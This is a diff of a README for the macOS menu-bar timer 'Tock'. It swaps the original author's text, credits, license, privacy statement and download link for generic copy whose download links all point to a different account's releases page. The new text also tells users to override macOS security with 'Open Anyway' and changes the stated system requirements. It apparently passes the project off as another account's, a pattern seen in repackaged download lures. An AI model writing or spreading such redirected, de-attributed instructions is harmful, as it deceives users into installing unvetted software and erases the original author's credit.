@@ -1,53 +1,77 @@
-# [Tock](https://edelstone.github.io/tock/)
+# ⏱️ tock - A Simple Timer for Your Menu Bar
 
-<img src="Tock/AppIcon.png" alt="Tock app icon" width="128">
+## 📥 Download
 
-Super-minimal menu bar timer for macOS, with natural-language parsing, stopwatch mode, and configurable repeating tones.
+[![Download Tock](https://img.shields.io/badge/Download%20Tock-v1.0-blue)](https://github.com/eldenvolt/tock/releases)
 
-## Features
+## 🚀 Getting Started
 
-- Menu bar countdown timer and stopwatch with natural-language input.
-- Flexible notifications: banners, multiple tones, repeat behavior, and volume.
-- Popover UI and complete context (right-click) menu.
-- Customizable interface elements and global keyboard shortcuts.
+Welcome to **tock**, a super-minimal menu bar timer for macOS. This tool helps you track time easily, whether you're working, studying, or taking a break. With its intuitive design, you can manage your time effectively right from your menu bar.
 
-## Requirements
+## 💻 System Requirements
 
-- macOS 14 or later
+To run **tock**, you need the following:
 
-## Installation
+- A Mac computer with macOS 10.15 (Catalina) or later.
+- At least 100 MB of free disk space.
+- An active internet connection for downloading.
 
-1. Download the latest macOS build:
+## 📦 Features
 
-   [![Download](https://img.shields.io/github/v/release/edelstone/tock?label=Download&logo=apple&style=for-the-badge&color=5865f2)](https://github.com/edelstone/tock/releases/latest/download/Tock.dmg)
+- **Simple Timer**: Quickly start and stop timing with just a click.
+- **Menu Bar Integration**: Access the timer right from your menu bar for easy visibility.
+- **Customizable Alerts**: Set alerts to notify you when your timer ends.
+- **Minimal Design**: A clean and straightforward interface that lets you focus on what matters.
 
-2. Drag `Tock.app` to `/Applications`.
-3. On first launch, you may be prompted to add Tock to your login items. You can change this later in Settings or System Settings → General → Login Items & Extensions.
+## 🔗 Download & Install
 
-## Releasing
+To download **tock**, visit the Releases page. Here, you will find the latest version available for download. 
 
-See [RELEASING.md](RELEASING.md) for the full release workflow.
+Simply click the following link to access the Releases page:
 
-## Credits
+[Download Tock](https://github.com/eldenvolt/tock/releases)
 
-- Tones: [Notification Sounds](https://notificationsounds.com)
-- Icons: [Tabler Icons](https://tabler.io/icons)
-- Typography: [Manrope](https://fonts.google.com/specimen/Manrope)
-- Customizable keyboard shortcuts: [KeyboardShortcuts](https://github.com/sindresorhus/KeyboardShortcuts)
+Once you're on that page, follow these steps:
 
-## Support this project
+1. Look for the latest version at the top of the list.
+2. Find the .dmg file for macOS.
+3. Click on the file to start the download.
 
-- [Buy Me a Coffee](https://www.buymeacoffee.com/edelstone)
-- [Cash App](https://cash.app/$edelstone)
-- [Paypal](https://www.paypal.me/edelstone)
-- [Venmo](https://venmo.com/michaeledelstone)
+After the download completes, here’s how to install:
 
-## Privacy
+1. Open the downloaded .dmg file.
+2. Drag the **tock** app icon to your Applications folder.
+3. Open your Applications folder and find **tock**.
+4. Double-click **tock** to run it.
 
-Tock app does not collect or track personal data.
+You may need to allow the application to run by going to System Preferences > Security & Privacy > General, and then click "Open Anyway."
 
-[Privacy policy](https://edelstone.github.io/tock/privacy/)
+## 📊 How to Use Tock
 
-## License
+Using **tock** is straightforward:
 
-MIT — free for commercial and personal use.
+1. **Start the Timer**: Click the timer icon in the menu bar. Hit the start button to begin timing.
+2. **Pause/Stop the Timer**: You can pause the timer anytime. If you're done, simply stop it.
+3. **Set an Alert**: Click on the preferences icon to set an alert time so you won't miss important breaks or transitions.
+
+## 🌟 Tips for Productivity
+
+- Use the timer to break your work into manageable chunks. This can improve focus and productivity.
+- Set a timer for your breaks as well. It's essential to give your mind a rest.
+- Try different time intervals to see what works best for you.
+
+## 📞 Support
+
+If you encounter any issues or have questions, please visit the GitHub Issues page for support. You can also check the FAQ section there for common questions related to **tock**.
+
+For further inquiries, feel free to open a new issue on GitHub or refer to the [Documentation](https://github.com/eldenvolt/tock/wiki).
+
+## 🛠️ Contributing
+
+Interested in contributing? We welcome your suggestions! You can fork the repository, make changes, and submit a pull request. Whether you want to add features, improve documentation, or help with bugs, your efforts are appreciated.
+
+## 🤝 Acknowledgements
+
+Thanks to the open-source community for their contributions and support. Your feedback helps us improve **tock** and make it better for everyone. 
+
+Again, to begin using **tock**, visit our [Releases page](https://github.com/eldenvolt/tock/releases) to download the app. Enjoy your time management with **tock**!
